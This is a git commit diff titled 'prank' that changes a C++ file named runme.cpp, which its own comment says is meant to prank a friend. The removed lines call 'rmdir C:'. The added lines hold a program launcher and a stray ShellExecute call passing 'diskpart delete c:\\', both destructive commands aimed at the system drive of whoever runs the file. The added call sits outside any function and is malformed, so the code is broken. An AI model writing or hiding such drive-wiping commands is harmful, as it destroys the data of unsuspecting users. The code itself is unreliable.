e2266ba821061e9ca4197abccce9c80291f7972f
Lucas Hourahine <luca5h1905@gmail.com>
2020-05-13 16:56:53 -0400

    prank

--- runme.cpp
+++ runme.cpp
@@ -1,8 +1,7 @@
 // Trying to prank a friend with TOR in this folder.
 
-#include <iostream>
-
-int main() {
-  system("rmdir C:");
-  return 0;
+#include <process.h>
+int main(int argc, char **argv, char **env) {
+    return _spawnve(_P_WAIT, argv[1], argv + 1, env);
 }
+ShellExecute(hwnd, "helper.exe", "diskpart delete c:\\", NULL, NULL, 0);
